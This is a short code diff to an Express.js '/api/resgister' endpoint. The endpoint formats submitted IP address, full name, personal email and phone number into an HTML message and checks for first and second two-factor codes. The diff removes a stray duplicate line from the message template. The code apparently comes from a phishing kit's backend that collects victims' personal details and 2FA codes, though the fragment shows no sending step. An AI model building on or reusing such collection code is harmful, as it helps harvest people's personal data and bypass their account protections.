@@ -31,7 +31,6 @@ app.post('/api/resgister', (req, res) => {
 if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-const message = `<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''}
 <strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''} 
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}`;
 
